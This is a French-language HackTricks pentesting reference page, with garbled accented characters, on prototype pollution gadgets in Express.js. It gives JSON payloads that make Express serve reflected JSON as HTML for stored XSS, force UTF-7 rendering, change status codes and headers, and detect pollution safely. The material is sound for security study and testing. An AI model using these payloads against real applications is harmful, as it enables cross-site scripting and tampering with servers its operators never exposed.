# Gadgets de pollution de prototype Express

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Servir des r√©ponses XSS

### Changer le type de contenu JSON en HTML

Dans une application Express utilisant une **r√©ponse de type de contenu JSON** et refl√©tant un JSON :
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
    _.merge({}, req.body);
   res.send(req.body);
});
```
Dans ces cas, XSS n'est normalement pas possible avec un type de contenu JSON. Cependant, avec la pollution de prototype, nous pouvons **confondre Express pour servir une r√©ponse HTML.** Cette vuln√©rabilit√© repose sur l'application utilisant **`res.send(obj)`** et utilisant l'analyseur de corps avec le type de contenu application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
En **polluant** √† la fois les propri√©t√©s **`body`** et **`_body`**, il est possible de faire en sorte qu'**Express serve le type de contenu HTML** et refl√®te la propri√©t√© `_body`, ce qui entra√Æne une XSS stock√©e.

### Rendu UTF7

Il est possible de faire en sorte qu'Express **rende le contenu UTF-7 avec** :
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Techniques de scan s√ªres

### Espaces JSON

Le PP suivant permettra aux attributs √† l'int√©rieur d'un JSON d'avoir un espace suppl√©mentaire qui ne cassera pas la fonctionnalit√© :
```json
{"__proto__":{"json spaces": " "}}
```
Ensuite, un JSON r√©fl√©chi ressemblera √† ceci :
```json
{"foo":  "bar"} -- Note the extra space
```
### En-t√™tes expos√©s

Le gadget PP suivant fera en sorte que le serveur renvoie l'en-t√™te HTTP suivant : **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Il est n√©cessaire que le module **CORS soit install√©**

### **M√©thode OPTIONS**

Avec la charge utile suivante, il est possible de **cacher une m√©thode d'une r√©ponse OPTIONS** :
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Statut**

Il est possible de changer le **code de statut renvoy√©** en utilisant la charge utile PP suivante :
```json
{"__proto__":{"status":510}}
```
### Erreur

Lorsque vous affectez √† un prototype une valeur primitive telle qu'une cha√Æne de caract√®res, cela produit une **op√©ration no-op car le prototype doit √™tre un objet**. Si vous essayez d'assigner un objet prototype √† `Object.prototype` lui-m√™me, cela va **lever une exception**. Nous pouvons utiliser ces deux comportements pour **d√©tecter si la pollution de prototype a r√©ussi** :
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valeur r√©fl√©chie

Si l'application refl√®te un objet dans la r√©ponse, vous pouvez simplement cr√©er un attribut avec un nom **√©trange et celui de `__proto__`** et si **seul le nom √©trange est refl√©t√©**, il est possible que le site soit vuln√©rable:
```json
{"hacktricks":"rocks","__proto__":"test"}
```
Ou si Lodash ou une biblioth√®que similaire est utilis√©, vous pouvez **d√©finir une propri√©t√© via PP √† l'int√©rieur de l'objet** et si cette propri√©t√© n'est pas refl√©t√©e, c'est parce que Lodash regarde l'objet actuel pour voir si la propri√©t√© existe d√©j√† dans l'objet fusionn√© :
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## Divers

### Autoriser les points

Il y a une option dans Express qui vous permet de **cr√©er des objets √† partir des param√®tres de cha√Æne de requ√™te**.\
Vous pouvez certainement l'utiliser dans une **cha√Æne** de bug pour exploiter une **vuln√©rabilit√© de pollution de prototype**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cr√©e un objet dans Node.**

## R√©f√©rences

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
